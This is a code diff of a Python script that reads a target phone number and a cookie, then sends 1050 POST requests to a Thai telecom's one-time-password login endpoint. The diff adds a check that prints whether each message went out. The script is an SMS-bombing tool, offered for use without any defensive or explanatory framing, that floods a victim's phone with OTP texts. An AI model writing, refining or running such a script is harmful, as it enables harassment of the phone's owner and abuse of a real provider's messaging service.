@@ -1,7 +1,8 @@
 import requests
 import time
-
+import json
 phone = input("PHONE ID : ")
+cookie = input("COOKIE ID : ")
 
 
 headers = {
@@ -34,4 +35,8 @@ for i in range(1050):
   i += 1
   name = requests.post("https://srfng.ais.co.th/api/v2/login/sendOneTimePW",data=data, headers=headers)
 
- 
+  result = name.json()
+  if (result['resultCode'] == '50000'):
+    print("Send Message Error!")
+  else:
+    print("Send Message Success!")
